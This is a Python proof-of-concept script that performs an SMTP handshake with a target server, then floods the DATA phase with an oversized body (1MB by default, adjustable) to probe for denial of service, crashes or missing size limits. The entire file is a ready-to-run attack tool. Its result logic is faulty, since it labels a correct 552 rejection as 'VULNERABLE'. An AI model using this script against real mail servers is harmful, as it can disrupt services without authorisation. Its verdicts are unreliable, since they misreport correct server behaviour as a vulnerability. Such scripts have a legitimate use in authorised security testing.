#!/usr/bin/env python3
import socket
import sys
import time

# Configuration
TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 25
PAYLOAD_SIZE = int(sys.argv[3]) if len(sys.argv) > 3 else 1024 * 1024  # Default 1MB
TIMEOUT = 10

def send_command(sock, cmd):
    """Send an SMTP command and return the server's response."""
    sock.sendall(f"{cmd}\r\n".encode())
    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
        # SMTP responses end with CRLF, check for completion
        if response.endswith(b"\r\n"):
            break
    return response.decode('utf-8', errors='ignore')

def main():
    print(f"[*] Connecting to SMTP server at {TARGET_HOST}:{TARGET_PORT}")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # 1. Read initial banner
        banner = sock.recv(4096).decode('utf-8', errors='ignore')
        print(f"[+] Server Banner: {banner.strip()}")
        
        # 2. EHLO handshake
        resp = send_command(sock, "EHLO poc.local")
        print(f"[+] EHLO Response: {resp.strip()}")
        if not resp.startswith('250'):
            print("[-] EHLO failed. Aborting.")
            sock.close()
            return
        
        # 3. MAIL FROM
        resp = send_command(sock, "MAIL FROM:<attacker@example.com>")
        print(f"[+] MAIL FROM Response: {resp.strip()}")
        if not resp.startswith('250'):
            print("[-] MAIL FROM failed. Aborting.")
            sock.close()
            return
        
        # 4. RCPT TO
        resp = send_command(sock, "RCPT TO:<victim@example.com>")
        print(f"[+] RCPT TO Response: {resp.strip()}")
        if not resp.startswith('250'):
            print("[-] RCPT TO failed. Aborting.")
            sock.close()
            return
        
        # 5. DATA command
        resp = send_command(sock, "DATA")
        print(f"[+] DATA Response: {resp.strip()}")
        if not resp.startswith('354'):
            print("[-] DATA command rejected. Aborting.")
            sock.close()
            return
        
        # 6. Send oversized payload
        print(f"[*] Sending {PAYLOAD_SIZE} bytes of payload...")
        # Construct a minimal valid email header + large body
        headers = "Subject: Oversized Payload Test\r\nFrom: attacker@example.com\r\nTo: victim@example.com\r\n\r\n"
        body = "A" * (PAYLOAD_SIZE - len(headers))
        message = headers + body + "\r\n.\r\n"
        
        sock.sendall(message.encode())
        
        # 7. Observe outcome
        try:
            final_resp = sock.recv(4096).decode('utf-8', errors='ignore')
            print(f"[+] Final Response: {final_resp.strip()}")
            
            if '552' in final_resp:
                print("[!] VULNERABLE: Server correctly rejected oversized message with 552 code.")
            elif '250' in final_resp:
                print("[!] VULNERABLE: Server accepted oversized message without enforcing limits.")
            else:
                print("[?] UNEXPECTED: Server returned an unusual response.")
                
        except socket.timeout:
            print("[!] VULNERABLE: Server timed out processing the oversized payload (potential DoS).")
        except ConnectionResetError:
            print("[!] VULNERABLE: Connection reset by server (potential crash or buffer overflow).")
            
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    main()